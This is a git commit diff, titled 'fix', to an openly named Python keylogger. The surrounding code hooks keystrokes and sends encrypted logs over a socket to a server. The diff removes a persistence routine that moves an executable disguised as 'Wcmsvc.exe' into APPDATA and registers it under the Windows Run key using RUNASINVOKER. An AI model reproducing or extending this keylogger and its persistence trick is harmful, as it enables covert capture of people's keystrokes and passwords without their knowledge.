68b745246e8c8d002613faa872150ea250097f4d
roberttimofte <roberttimofte15@gmail.com>
2022-02-19 17:47:19 +0100

    fix

--- keylogger.py
+++ keylogger.py
@@ -3,7 +3,6 @@ from threading import Timer
 from datetime import datetime
 from socket import *
 from cryptography.fernet import Fernet
-import os
 
 SERVER = 'localhost'
 PORT = 8888
@@ -54,23 +53,8 @@ class Keylogger:
         print("[+] log sent")
         clientSocket.close()
 
-    def setWinRegKey(self):
-        check = subprocess.Popen("REG query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc", shell=True, stdout=subprocess.PIPE)
-        subprocess_return = check.stdout.read()
-    
-        if "REG_SZ" not in str(subprocess_return):
-            for root, dirs, files in os.walk("C:\\"):
-                if "Wcmsvc.exe" in files:
-                    full_path = os.path.join(root, "Wcmsvc.exe")
-                    break
-        
-            os.rename(full_path, os.getenv('APPDATA')+'\\Wcmsvc.exe')
-        
-            subprocess.run('cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc /d "'+os.getenv('APPDATA')+'\\Wcmsvc.exe'+'""')
-
     def start(self):
         try:
-            #self.setWinRegKey()
             keyboard.on_release(callback=self.callback)
             self.report()
             keyboard.wait()
